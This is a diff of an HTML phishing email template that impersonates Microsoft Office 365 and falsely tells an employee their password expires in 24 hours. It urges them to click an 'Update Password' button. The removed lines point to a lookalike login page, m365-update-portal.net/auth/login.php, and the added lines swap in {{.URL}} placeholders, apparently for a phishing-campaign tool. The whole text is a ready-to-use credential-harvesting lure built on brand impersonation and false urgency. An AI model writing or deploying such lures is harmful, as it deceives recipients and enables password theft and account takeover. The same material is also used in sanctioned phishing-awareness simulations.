@@ -7,13 +7,13 @@ Content-Type: text/html; charset="UTF-8"
 
 <div style="background: #ffffff; font-family: 'Segoe UI', Arial, sans-serif; max-width: 580px; margin: auto; padding: 40px; border: 1px solid #e1e1e1;">
   <div style="margin-bottom: 35px;">
-    <img src="https://img.icons8.com/color/96/microsoft-office2019.png" alt="Office 365" style="width: 40px;">
+    <img src="{{.URL}}" alt="Office 365" style="width: 40px;">
   </div>
   <h2 style="color: #333; margin-bottom: 25px;">Your password is expiring.</h2>
   <p style="color: #555; font-size: 16px; line-height: 1.5;">Your corporate password for <b>employee@company.com</b> will expire in 24 hours.</p>
   <p style="color: #555; font-size: 16px; line-height: 1.5;">To keep your account active and avoid losing access to Microsoft Teams and Outlook, please update your password now using our secure update portal.</p>
   <div style="margin-top: 35px; border-top: 1px solid #eee; padding-top: 30px;">
-    <a href="http://m365-update-portal.net/auth/login.php" style="background: #0078d4; color: white; padding: 12px 35px; text-decoration: none; border-radius: 2px; font-weight: bold; display: inline-block;">Update Password</a>
+    <a href="{{.URL}}" style="background: #0078d4; color: white; padding: 12px 35px; text-decoration: none; border-radius: 2px; font-weight: bold; display: inline-block;">Update Password</a>
   </div>
   <p style="font-size: 12px; color: #999; margin-top: 45px;">
     Office 365 | Microsoft Corporation | One Microsoft Way, Redmond, WA
